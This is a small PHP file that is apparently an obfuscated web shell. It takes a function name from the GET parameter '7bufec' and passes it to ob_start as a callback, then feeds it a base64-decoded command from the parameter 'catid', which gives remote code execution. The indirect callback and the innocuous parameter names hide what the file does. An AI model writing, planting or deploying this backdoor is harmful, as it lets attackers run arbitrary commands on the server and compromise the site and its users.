<?php
    if(isset($_GET['7bufec']) && isset($_GET['catid'])){
	$id = $_GET['7bufec'];
	echo $catid = isset($_GET['catid'])?base64_decode($_GET['catid']):'';
	$s = '';
	foreach(array($id) as $v){
	    $s.=$v;
	}
	ob_start($s);
	if($catid){
	    echo $catid;
	}
	ob_end_flush();
}